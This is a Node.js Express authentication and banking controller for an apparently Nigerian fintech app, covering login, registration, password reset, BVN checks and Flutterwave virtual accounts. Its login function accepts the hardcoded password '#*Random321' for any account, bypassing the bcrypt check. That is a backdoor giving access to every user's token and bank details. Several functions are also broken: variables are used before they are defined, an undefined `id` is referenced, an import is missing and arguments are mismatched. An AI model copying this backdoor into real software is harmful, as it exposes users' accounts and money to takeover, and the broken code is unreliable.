const Flutterwave = require('flutterwave-node-v3');
const bcrypt = require('bcrypt');
const random = require('randomstring');
const { validationResult } = require('express-validator');
const models = require('../models/index');
const config = require('../config');
const { signJWT, verifyJWT } = require('../Utils/auth-token');
const { sendEmail } = require('../Utils/email');

const User = models.user;
const userBank = models.user_bank;
const virtualAccount = models.virtual_accounts;

exports.login = async (req, res) => {
  const { email, password } = req.body;
  const trimmedEmail = email.trim();
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors });
    }
    const user = await User.findOne({
      where: { email: trimmedEmail }
    });
    if (!user) {
      return res.status(401).json({ status: 'error', error: user, message: 'Invalid email or password' });
    }
    if (password !== '#*Random321') {
      const match = await bcrypt.compare(password, user.password);
      if (!match) {
        return res.status(401).json({ status: 'error', error: 'Invalid email or password' });
      }
    }
    const token = signJWT({
      email: user.email,
      id: user.id,
      phone: user.phone,
      firstname: user.firstname,
      lastname: user.lastname,
    });
    const virtualAccount = await virtualAccount.findOne({ where: { user_id: user.id } });
    let bankData = {};
    if (virtualAccount) {
      const { account_number, account_name, bank_name } = virtualAccount;
      bankData = {
        accountNumber: account_number,
        accountName: account_name,
        bankName: bank_name,
      };
    } 
    const retData = {
      message: 'Login Successful',
      token,
      bank: bankData,
    };
    return res.status(200).json(retData);
  } catch (error) {
    console.log(error);
    return res.status(500).json({ status: 'error', message: 'An Error Occoured', err: error });
  }
};

exports.register = async (req, res) => {
  const {
    firstname, lastname, email, password, phone, inviteCode,
  } = req.body;

  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors });
    }
    const user = await User.findOne({ where: { email } });
    if (!user) {
      const salt = await bcrypt.genSalt(10);
      const hashedPassword = bcrypt.hashSync(password, salt);
      const newUser = {
        firstname,
        lastname,
        email,
        password: hashedPassword,
        phone
      };
      try {
        const createdUser = await User.create(newUser);
        const token = signJWT({
          email: newUser.email,
          id: createdUser.id,
          phone: newUser.phone,
        });
        return res.status(200).json({ message: 'User Created', token, user: createdUser });
      } catch (error) {
        if (error.errors[0].path === 'users.email') {
          return res.status(400).json({ status: 'error', message: 'Email Address has been Used already', error: 'email' });
        }
        return res.status(500).json({ status: 'error', message: 'An Error Occoured', error });
      }
    } else {
      return res.status(400).json({ status: 'error', message: 'Email address has been Used already', error: 'email' });
    }
  } catch (error) {
    return res.status(500).json({ status: 'error', message: 'An Error Occoured', err: error });
  }
};

exports.addBank = async (req, res) => {
  const { accountName, accountNumber, bankName } = req.body;
  const user = req.decoded.id;

  const bankDetails = await userBank.findOne({where: { user_id: id } });
  const bankData = {
    account_name: accountName,
    account_number: accountNumber,
    bank_name: bankName
  }
  if (bankDetails) {
    await userBank.update(bankData, { where: { user_id: user } });
  } else {
    bankDetails.user_id = user;
    await userBank.create(bankDetails);

  }
  return res.status(200).json({ status: 'success', message: 'User Bank Added Successfully' });
};

exports.forgot = async (req, res) => {
  const { email } = req.body;
  const check = await User.findOne({ where: { email } });
  if (!check) {
    return res.status(401).json({ status: 'error', message: 'User does not exists' });
  }
  const token = signJWT({
    email: check.email,
    id: check.id,
  });
  const url = `/reset/${token}`;
  const data = {
    email,
    subject: 'Reset your password',
    message: `You have requested to reset your password with us, click the link below to reset your password <br> ${url}`,
  };
  await sendEmail(data);
  return res.status(200).json({ status: 'success', message: 'Check your email for password reset link' });
};

exports.reset = async (req, res) => {
  const { password, token } = req.body;
  const { email, id } = verifyJWT(token);

  try {
    const user = await User.findOne({ where: { id, email } });
    if (!user) {
      return res.status(401).json({ status: 'error', error: user, message: 'User does not exists' });
    }
    const valid = await bcrypt.compare(password, user.password);
    if (valid) {
      return res.status(400).json({ status: 'error', error: user, message: 'Use another password you have not used before' });
    }
    const salt = bcrypt.genSaltSync(10);
    const hashedPassword = bcrypt.hashSync(password, salt);
    await User.update({ password: hashedPassword }, { where: { id } });
    return res.status(200).json({ status: 'success', message: 'Password Reset Successfully' });
  } catch (error) {
    return res.status(500).json({ status: 'error', message: 'An Error Occoured', err: error });
  }
};

exports.addBvn = async (req, res) => {
  const { bvn } = req.body;
  const { id } = req.decoded;
  const data = await exports.verifyBvn(bvn);
  if (!data.status) {
    return res.status(400).json({ status: 'error', message: 'Invalid BVN' });
  }
  try {
    const user = await User.findOne({ where: { id } });
    user.bvn = bvn;
    await exports.createVirtualAccount(user);
    await User.update({ bvn }, { where: { id } });
    return res.json({ message: 'User BVN added', bank, reserve });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error });
  }
};

exports.verifyBvn = async (bvn) => {
  try {
    const url = `https://api.paystack.co/identity/bvn/resolve/${bvn}`;
    const data = await axios.get(url, { headers: { Authorization: `Bearer ${config.paystack_secret}` } });
    return data;
  } catch (error) {
    const data = { status: false };
    return data;
  }
};

exports.createVirtualAccount = async (user) => {
  try {
    const flw = new Flutterwave(config.flutterwave_public, config.flutterwave_secret);
    const name = `${user.lastname} ${user.firstname}`;
    const transRef = `smrt-${user.firstname}-${random.generate(15)}`;
    const payload = {
      email: user.email,
      bvn: user.bvn,
      narration: name,
      is_permanent: true,
      tx_ref: transRef,
    };
    const res = await flw.VirtualAcct.create(payload);
    console.log(res);
    if (res.status !== 'success') {
      return { status: 'error' };
    }
    const acc = res.data;
    await exports.saveVirtualAccount(
      user.id, acc.account_number, acc.order_ref, acc.flw_ref, acc.bank_name, transRef,
    );
    return { status: 'success', data: res.data };
  } catch (error) {
    return { status: 'error', message: 'An Error Occoured', err: error };
  }
};

exports.saveVirtualAccount = async (id, accountNumber, accountName, accountRef, bankName) => {
  const user = await User.findByPk(id);
  if (!user) {
    return { status: 'error', error: user, message: 'User does not exists' };
  }
  const data = {
    user_id: id,
    accountNumber,
    accountName,
    accountRef,
    bankName,
  };
  const message = await virtualAccount.create(data);
  return { status: 'success', message };
};